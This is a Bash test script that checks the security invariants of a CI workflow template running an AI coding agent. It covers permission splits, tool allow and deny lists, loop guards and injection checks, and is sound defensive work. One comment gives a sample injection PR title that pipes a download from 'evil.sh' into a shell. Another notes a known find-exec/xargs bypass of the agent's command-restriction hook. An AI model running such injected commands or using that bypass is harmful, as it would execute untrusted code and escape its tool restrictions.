#!/usr/bin/env bash
# The post-merge workflow's security invariants.
#
# This file is rendered into other people's repositories and runs with a write
# token. Every property below is one someone could plausibly remove while
# "simplifying" the workflow, and each removal is silently exploitable rather
# than loudly broken.

_dossier_test_begin "workflow-template"

WF="plugins/dossier/templates/ci/dossier-docs-refresh.yml"
assert_file_exists "$WF" "workflow template exists"

BODY=$(cat "$WF" 2>/dev/null)

# --- Parses as YAML ----------------------------------------------------------
if command -v python3 >/dev/null 2>&1 && python3 -c 'import yaml' 2>/dev/null; then
  # Placeholders are substituted at render time and are not valid YAML values in
  # every position, so substitute plausible values before parsing.
  TMP=$(mktemp 2>/dev/null) || TMP="/tmp/dossier-wf.$$"
  # The path-filter placeholder sits at column 0 and setup renders an indented
  # block sequence into it; reproduce that indentation or the parse is testing
  # the wrong document.
  sed -e 's/^{{DOSSIER_PATH_FILTERS}}/      - "src\/**"/' \
      -e "s/{{DOSSIER_SCHEDULE_CRON}}/0 6 * * 1/" \
      -e 's/{{DOSSIER_TRIGGER_EVENT}}/pull_request/' \
      -e 's/{{DOSSIER_ROLLING_BRANCH}}/docs\/dossier/' \
      -e 's/{{DOSSIER_DOCS_DIR}}/docs\/dossier/' \
      -e 's/{{DOSSIER_MARKETPLACE_URL}}/https:\/\/example.invalid\/m.git/' \
      -e 's/{{DOSSIER_MARKETPLACE_REPO}}/synaptiai\/synapti-marketplace/' \
      -e 's/{{DOSSIER_REF}}/v1.0.0/' \
      -e 's/{{DOSSIER_PLUGIN_VERSION}}/1.0.0/' \
      -e 's/{{DOSSIER_LABEL_GENERATED}}/dossier:generated/' \
      -e 's/{{DOSSIER_LABEL_SKIP}}/docs:skip/' \
      -e 's/{{DOSSIER_LABEL_OVERSIZED}}/dossier:oversized/' \
      "$WF" > "$TMP"
  if python3 -c "import yaml,sys; yaml.safe_load(open(sys.argv[1]))" "$TMP" 2>/dev/null; then
    _dossier_assert_pass "workflow parses as YAML after placeholder substitution"
  else
    _dossier_assert_fail "workflow does not parse as YAML: $(python3 -c "import yaml,sys; yaml.safe_load(open(sys.argv[1]))" "$TMP" 2>&1 | tail -1)"
  fi
  rm -f "$TMP" 2>/dev/null
else
  _dossier_assert_pass "yaml module unavailable — parse check skipped, structural checks still run"
fi

# --- Privilege split ---------------------------------------------------------
# Three jobs, and the agent job must never hold a write token.
for job in "  policy:" "  scan:" "  refresh:" "  publish:"; do
  assert_contains "$job" "$BODY" "job ${job# } declared"
done

assert_match '^permissions: \{\}' "$BODY" "top-level permissions is empty — per-job grants only"

# The scan job (issue #137): isolated osv-scanner/pyscn execution. Same
# privilege posture as policy — read-only, no write token, no agent.
SCAN_BLOCK=$(awk '/^  scan:/{f=1} /^  refresh:/{f=0} f' "$WF")
assert_contains "contents: read" "$SCAN_BLOCK" "scan job has contents: read"
assert_not_contains "contents: write" "$SCAN_BLOCK" "scan job has NO write permission"
assert_not_contains "pull-requests: write" "$SCAN_BLOCK" "scan job cannot open PRs"
assert_not_contains "anthropics/claude-code-action" "$SCAN_BLOCK" "scan job runs NO agent"
assert_not_contains "ANTHROPIC_API_KEY" "$SCAN_BLOCK" "scan job never sees the Anthropic key"
assert_not_contains "CLAUDE_CODE_OAUTH_TOKEN" "$SCAN_BLOCK" "scan job never sees the OAuth token"
assert_contains "persist-credentials: false" "$SCAN_BLOCK" "scan job does not persist git credentials"
assert_contains "timeout-minutes:" "$SCAN_BLOCK" "scan job declares a timeout"
assert_contains "dossier-scan-security.sh" "$SCAN_BLOCK" "scan job invokes the security scanner wrapper"
assert_contains "dossier-scan-quality.sh" "$SCAN_BLOCK" "scan job invokes the quality scanner wrapper"
assert_contains "upload-artifact" "$SCAN_BLOCK" "scan job uploads its results as an artifact"
assert_contains "name: dossier-scan" "$SCAN_BLOCK" "scan job's artifact is named dossier-scan"
# pyscn's raw output carries no untrusted-content note of its own (unlike
# the wrapper's own envelope, which does, and unlike pyscn's envelope, which
# already embeds its findings inline) -- must not ship in the uploaded
# artifact unannotated. osv-scanner's raw output is the opposite case: its
# wrapper's envelope embeds no findings of its own, so the raw file is the
# only artifact in the bundle a downstream Read can get citable
# vulnerability content from -- it must survive to the uploaded artifact,
# never be deleted alongside pyscn's.
#
# Anchored on the actual `run: rm -f ...` step, not any line that merely
# mentions a filename -- the surrounding comments name both files by design
# (explaining why one is kept and one isn't), so a bare substring match
# would pass even if the real step were deleted, relocated after upload, or
# widened to remove osv-scan-raw.json too.
CLEANUP_RUN_LINE=$(printf '%s\n' "$SCAN_BLOCK" | grep -n '^ *run: rm -f' | head -1)
CLEANUP_LINE_NUM=$(printf '%s' "$CLEANUP_RUN_LINE" | cut -d: -f1)
CLEANUP_LINE_CONTENT=$(printf '%s' "$CLEANUP_RUN_LINE" | cut -d: -f2-)
assert_contains "pyscn-scan-raw.json" "$CLEANUP_LINE_CONTENT" "the actual rm -f step removes pyscn's un-annotated raw output before upload"
assert_not_contains "osv-scan-raw.json" "$CLEANUP_LINE_CONTENT" "the actual rm -f step does NOT remove osv-scanner's raw output -- it is the only bundle artifact carrying citable vulnerability content"
UPLOAD_LINE_NUM=$(printf '%s\n' "$SCAN_BLOCK" | grep -n 'name: Upload the scan bundle' | head -1 | cut -d: -f1)
if [ -n "$UPLOAD_LINE_NUM" ] && [ -n "$CLEANUP_LINE_NUM" ] && [ "$CLEANUP_LINE_NUM" -lt "$UPLOAD_LINE_NUM" ]; then
  _dossier_assert_pass "raw-output cleanup runs before the artifact upload, not after"
else
  _dossier_assert_fail "raw-output cleanup does not run before the artifact upload"
fi
assert_not_contains "@latest" "$SCAN_BLOCK" "scan job's tool install does not float on @latest"
if printf '%s' "$SCAN_BLOCK" | grep -qE 'OSV_VERSION=v[0-9]+\.[0-9]+\.[0-9]+'; then
  _dossier_assert_pass "scan job pins an explicit osv-scanner release version"
else
  _dossier_assert_fail "scan job does not pin an explicit osv-scanner release version"
fi
assert_contains "sha256sum -c" "$SCAN_BLOCK" "scan job verifies the downloaded osv-scanner binary by checksum"
if printf '%s' "$SCAN_BLOCK" | grep -qE "pyscn==[0-9]+\.[0-9]+\.[0-9]+"; then
  _dossier_assert_pass "scan job pins an explicit pyscn version"
else
  _dossier_assert_fail "scan job does not pin an explicit pyscn version"
fi

# The refresh job (the one running the agent) must have contents: read.
REFRESH_BLOCK=$(awk '/^  refresh:/{f=1} /^  publish:/{f=0} f' "$WF")
assert_contains "contents: read" "$REFRESH_BLOCK" "refresh job has contents: read"
assert_not_contains "contents: write" "$REFRESH_BLOCK" "refresh job has NO write permission"
assert_not_contains "pull-requests: write" "$REFRESH_BLOCK" "refresh job cannot open PRs"
assert_contains "persist-credentials: false" "$REFRESH_BLOCK" "refresh job does not persist git credentials"

# refresh now depends on scan too (for the artifact download), and must
# proceed even if scan itself fails outright (not just reports a non-ok
# status) — GitHub Actions ANDs an implicit success() onto every needs:
# entry, so needs: [policy, scan] alone would silently skip refresh on a
# scan-job failure unrelated to the wrapper scripts (e.g. a network blip
# during the tool install), directly contradicting the "must never block
# documenting the range" guarantee (/flow:review PR#137, code-reviewer P2).
# always() overrides that implicit gate; needs.policy.outputs.should_run
# still correctly gates on policy specifically, since a failed policy job
# never sets that output.
assert_contains "needs: [policy, scan]" "$BODY" "refresh depends on both policy and scan"
assert_contains "always() && needs.policy.outputs.should_run" "$BODY" "refresh's if: is not implicitly success-gated on scan alone"
assert_contains "dossier-scan" "$REFRESH_BLOCK" "refresh downloads the scan bundle artifact"

# The download step must not hard-fail refresh when scan never uploaded the
# artifact (the always() change above makes that reachable: refresh can now
# run even when scan failed to produce anything).
SCAN_DOWNLOAD_BLOCK=$(awk '/Download the scan bundle/{f=1} f{print} f && /path: \.dossier\/scan\//{exit}' "$WF")
assert_contains "continue-on-error: true" "$SCAN_DOWNLOAD_BLOCK" "the scan-bundle download step tolerates a missing artifact"

# The publish job holds the write token and must run no agent.
PUBLISH_BLOCK=$(awk '/^  publish:/{f=1} f' "$WF")
assert_contains "contents: write" "$PUBLISH_BLOCK" "publish job has contents: write"
assert_not_contains "anthropics/claude-code-action" "$PUBLISH_BLOCK" "publish job runs NO agent"
assert_not_contains "ANTHROPIC_API_KEY" "$PUBLISH_BLOCK" "publish job never sees the Anthropic key"

# The agent runs exactly once, in the refresh job.
ACTION_COUNT=$(grep -c 'uses: anthropics/claude-code-action' "$WF" 2>/dev/null || echo 0)
assert_equal "1" "$ACTION_COUNT" "the agent action appears exactly once"
assert_contains "anthropics/claude-code-action" "$REFRESH_BLOCK" "the agent runs in the refresh job"

# --- Loop prevention ---------------------------------------------------------
# Four independent guards, evaluated by GitHub before a runner is allocated.
assert_contains "merged == true" "$BODY" "guard: only merged pull requests"
assert_contains "startsWith(github.event.pull_request.head.ref" "$BODY" "guard: head-ref prefix"
assert_contains "labels.*.name" "$BODY" "guard: label checks"
assert_contains "github-actions[bot]" "$BODY" "guard: bot actor"

# --- No force-push anywhere --------------------------------------------------
# Fetch refspecs legitimately use a leading +; pushes must not.
if grep -E '^\s*git push' "$WF" | grep -qE '(--force|--force-with-lease|[[:space:]]\+refs)'; then
  _dossier_assert_fail "workflow contains a forced push"
else
  _dossier_assert_pass "no forced push anywhere"
fi

# Merge-forward, never rebase — a rebase would require the force-push above.
if grep -qE '^\s*git rebase' "$WF"; then
  _dossier_assert_fail "workflow rebases the docs branch"
else
  _dossier_assert_pass "no rebase (merge-forward only)"
fi

# --- Shell injection ---------------------------------------------------------
# Untrusted values must reach shell as env vars, never as ${{ }} interpolation
# inside a run: body. A PR titled '; curl evil.sh | sh; #' would otherwise run.
VIOLATIONS=$(awk '
  /run: *\|?/ { inrun=1; indent=match($0, /[^ ]/); next }
  inrun && NF && match($0, /[^ ]/) <= indent { inrun=0 }
  inrun && /\$\{\{ *(github\.event|inputs\.|github\.head_ref)/ { print NR": "$0 }
' "$WF")
if [ -z "$VIOLATIONS" ]; then
  _dossier_assert_pass "no untrusted \${{ }} interpolation inside any run: block"
else
  _dossier_assert_fail "untrusted interpolation inside run: — $(printf '%s' "$VIOLATIONS" | head -2)"
fi

# --- Concurrency and history -------------------------------------------------
assert_contains "concurrency:" "$BODY" "workflow serializes runs"
assert_contains "cancel-in-progress: false" "$BODY" "runs are not cancelled mid-agent"
assert_contains "fetch-depth: 0" "$BODY" "full history — a shallow clone silently yields the wrong range"

# github.sha is the test-merge commit on pull_request events, not a commit on
# the base branch. Using it produces a range that looks right and is not.
assert_contains "merge_commit_sha" "$BODY" "uses merge_commit_sha, not github.sha"

# --- Credential preflight fails loudly ---------------------------------------
assert_contains "::error" "$BODY" "emits an error annotation on misconfiguration"
assert_contains "gh secret set" "$BODY" "remediation names the exact command"
assert_contains "not permitted to create" "$BODY" "handles the Actions-cannot-create-PRs failure"

# --- Plugin install ----------------------------------------------------------
assert_contains "plugin_marketplaces" "$BODY" "installs the marketplace"
assert_contains "dossier@synapti-marketplace" "$BODY" "installs the dossier plugin"
assert_contains "/dossier:refresh" "$BODY" "invokes the refresh command"

# --- Tool restriction --------------------------------------------------------
assert_contains "allowedTools" "$BODY" "restricts the agent's tools"
assert_contains "disallowedTools" "$BODY" "explicitly denies dangerous tools"

# refresh.md dispatches a collector plus per-document drafters and loads four
# skills. Omit Agent/Skill from the allowlist and every one of those calls is
# unreachable in a headless run — the fan-out silently degrades to flat inline
# drafting with no signal that it happened.
# Anchor on the flag itself: a bare 'allowedTools' grep matches the substring
# inside '--disallowedTools' in the design-notes header first.
ALLOWED=$(grep -m1 -- '--allowedTools "' "$WF")
for needed in "Agent" "Skill"; do
  assert_contains "$needed" "$ALLOWED" "CI allowlist includes $needed (refresh.md dispatches it)"
done
for denied in "WebFetch" "git push"; do
  DIS=$(grep -A3 'disallowedTools' "$WF" | head -8)
  assert_contains "$denied" "$DIS" "denies $denied"
done

# The refresh job's agent is the only place enforce-allowed-actions.sh's
# scanner deny-blocks could matter in CI (the scan job is a plain shell step
# with no agent at all) — so the refresh job's own Bash allowlist is the real
# backstop against the hook's known find-exec/xargs-I{} bypass (issue #143).
# Granular Bash(cmd:*) entries are the boundary; find/xargs are absent from
# the list entirely, not merely unlisted alongside others.
for excluded in "Bash(find" "Bash(xargs" "Bash(osv-scanner" "Bash(pyscn"; do
  assert_not_contains "$excluded" "$ALLOWED" "CI allowlist excludes $excluded — the find-exec/xargs hook bypass (#143) cannot reach a tool the refresh job was never granted"
done

# --- Prompt is static --------------------------------------------------------
# The prompt carries a path, never attacker-controlled content.
PROMPT_LINE=$(grep -E '^\s*prompt:' "$WF" | head -1)
if printf '%s' "$PROMPT_LINE" | grep -q 'github.event'; then
  _dossier_assert_fail "prompt interpolates event data — it must carry a path only"
else
  _dossier_assert_pass "prompt is static (carries a path, not content)"
fi

# --- Managed-file stamp placeholder ------------------------------------------
assert_contains "{{DOSSIER_ROLLING_BRANCH}}" "$BODY" "branch prefix is render-time substituted"
assert_contains "{{DOSSIER_DOCS_DIR}}" "$BODY" "docs dir is render-time substituted"

# --- The cursor must not advance on a failed run -----------------------------
# Every substantive publish step is gated on has_changes, so a genuine no-op
# skips them and the job succeeds — the no-op advance still happens. A FAILED
# run is different: leaving the cursor where it was is what makes the next run's
# range widen instead of skipping the changes that failed to publish. `always()`
# collapses those two cases into one and produces a silent documentation gap.
CURSOR_BLOCK=$(awk '/- name: Advance the documentation cursor/{f=1} f{print} f&&/run:/{exit}' "$WF")
if printf '%s' "$CURSOR_BLOCK" | grep -q 'if: *always()'; then
  _dossier_assert_fail "the cursor advances with always(), so a failed publish silently skips its range"
else
  _dossier_assert_pass "the cursor does not advance with always()"
fi
if printf '%s' "$CURSOR_BLOCK" | grep -q "if: *success()"; then
  _dossier_assert_pass "the cursor advance is gated on success()"
else
  _dossier_assert_fail "the cursor advance is not gated on success()"
fi

# --- Stale-sweep documents reach the blast radius ----------------------------
# The policy job's decision must surface as a job output, and the evidence-
# bundle step must thread it into dossier-blast-radius.sh, or a schedule-
# triggered stale-sweep run computes should_run=true but the affected
# document never actually gets a verification pass.
assert_contains "stale_docs: \${{ steps.decide.outputs.stale_docs }}" "$BODY" "policy job exposes stale_docs as a job output"
assert_contains "STALE_DOCS: \${{ steps.decide.outputs.stale_docs }}" "$BODY" "the evidence-bundle step reads stale_docs from the decide step"
assert_contains "STALE_DOCS_ARGS" "$BODY" "dossier-blast-radius.sh is invoked with the stale-docs list when present"

_dossier_test_summary
